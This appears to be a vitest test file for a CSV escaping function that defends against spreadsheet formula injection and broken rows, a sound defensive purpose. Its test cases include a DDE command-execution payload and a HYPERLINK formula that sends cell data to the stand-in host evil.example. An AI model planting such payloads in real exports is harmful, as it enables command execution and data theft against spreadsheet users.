import { describe, expect, it } from "vitest";
import { escapeCsvValue } from "./csv-escape";

/**
 * The hazard, restated as a test oracle: a spreadsheet evaluates a cell whose
 * content opens with `=`, `+`, `-`, `@`, TAB, or CR — past any leading
 * whitespace — and a bare `"`, `,`, LF, or CR in a field breaks the row apart.
 *
 * Every expected value below is written from that contract, not from what the
 * implementation happens to emit. The two invariant sweeps at the bottom then
 * re-derive the same answer from the parsed field, so a table row that agreed
 * with a wrong implementation would still fail there.
 */

/** A cell a spreadsheet would evaluate rather than display. */
const FORMULA_CELL_PATTERN = /^\s*[=+\-@\t\r]/;
/** Anything that may not appear in an UNQUOTED CSV field. */
const BARE_STRUCTURAL_PATTERN = /[",\r\n]/;

const ESCAPE_CASES: { name: string; input: string; expected: string }[] = [
  // The four operators that open a formula.
  { name: "leading equals", input: "=1+1", expected: "'=1+1" },
  { name: "leading plus", input: "+1+1", expected: "'+1+1" },
  { name: "leading minus", input: "-1+1", expected: "'-1+1" },
  { name: "leading at", input: "@SUM(A1)", expected: "'@SUM(A1)" },
  // The two whitespace characters that are themselves triggers: a spreadsheet
  // skips them and evaluates what follows.
  { name: "leading tab trigger", input: "\t=1+1", expected: "'\t=1+1" },
  { name: "leading CR trigger", input: "\r=1+1", expected: '"\'\r=1+1"' },
  { name: "lone tab", input: "\t", expected: "'\t" },
  // Leading whitespace before a trigger — what defeats a first-character test.
  { name: "space before equals", input: " =1+1", expected: "' =1+1" },
  { name: "tabs before plus", input: "\t\t+1+1", expected: "'\t\t+1+1" },
  {
    name: "space and tab before at",
    input: " \t@SUM(A1)",
    expected: "' \t@SUM(A1)",
  },
  { name: "LF before equals", input: "\n=1+1", expected: '"\'\n=1+1"' },
  {
    name: "non-breaking space before equals",
    input: "\u00a0=1+1",
    expected: "'\u00a0=1+1",
  },
  // Real payloads.
  {
    name: "command execution payload",
    input: "=cmd|' /c calc'!A0",
    expected: "'=cmd|' /c calc'!A0",
  },
  {
    name: "data-exfiltration hyperlink",
    input: '=HYPERLINK("http://evil.example/?d="&A1,"click")',
    expected: '"\'=HYPERLINK(""http://evil.example/?d=""&A1,""click"")"',
  },
  // Structural characters, with no formula trigger.
  {
    name: "embedded comma",
    input: "Lovelace, Ada",
    expected: '"Lovelace, Ada"',
  },
  {
    name: "embedded quote",
    input: 'Ada "AL" Lovelace',
    expected: '"Ada ""AL"" Lovelace"',
  },
  { name: "embedded LF", input: "Ada\nLovelace", expected: '"Ada\nLovelace"' },
  { name: "embedded CR", input: "Ada\rLovelace", expected: '"Ada\rLovelace"' },
  {
    name: "embedded CRLF",
    input: "Ada\r\nLovelace",
    expected: '"Ada\r\nLovelace"',
  },
  // Nothing dangerous: no marker, byte-identical.
  { name: "ordinary name", input: "Ada Lovelace", expected: "Ada Lovelace" },
  {
    name: "unattributed sentinel",
    input: "Unattributed",
    expected: "Unattributed",
  },
  { name: "empty", input: "", expected: "" },
  {
    name: "interior at sign",
    input: "ada@example.com",
    expected: "ada@example.com",
  },
];

describe("escapeCsvValue", () => {
  it.each(ESCAPE_CASES)("escapes $name", ({ input, expected }) => {
    expect(escapeCsvValue(input)).toBe(expected);
  });

  it.each(ESCAPE_CASES)(
    "leaves $name inert once the field is parsed back",
    ({ input }) => {
      expect(
        FORMULA_CELL_PATTERN.test(parseCsvField(escapeCsvValue(input)))
      ).toBe(false);
    }
  );

  it.each(ESCAPE_CASES)(
    "keeps $name inside one field and one record",
    ({ input }) => {
      const field = escapeCsvValue(input);
      if (field.startsWith('"')) {
        // A quoted field is bounded by the outer quotes; every interior quote
        // must be doubled or the field ends early.
        expect(field.endsWith('"')).toBe(true);
        expect(field.slice(1, -1).replaceAll('""', "")).not.toContain('"');
        return;
      }
      expect(BARE_STRUCTURAL_PATTERN.test(field)).toBe(false);
    }
  );

  it("emits no apostrophe marker for a value that triggered nothing", () => {
    // The marker means "this was dangerous". Stamping it on every field would
    // make it meaningless and would corrupt every ordinary name in the file.
    expect(escapeCsvValue("Ada Lovelace")).not.toContain("'");
    expect(escapeCsvValue("")).toBe("");
  });

  it("escapes numeric fields through the same path", () => {
    expect(escapeCsvValue(1234)).toBe("1234");
  });
});

/** The cell content a CSV reader recovers from one escaped field. */
function parseCsvField(field: string): string {
  if (field.startsWith('"') && field.endsWith('"') && field.length >= 2) {
    return field.slice(1, -1).replaceAll('""', '"');
  }
  return field;
}
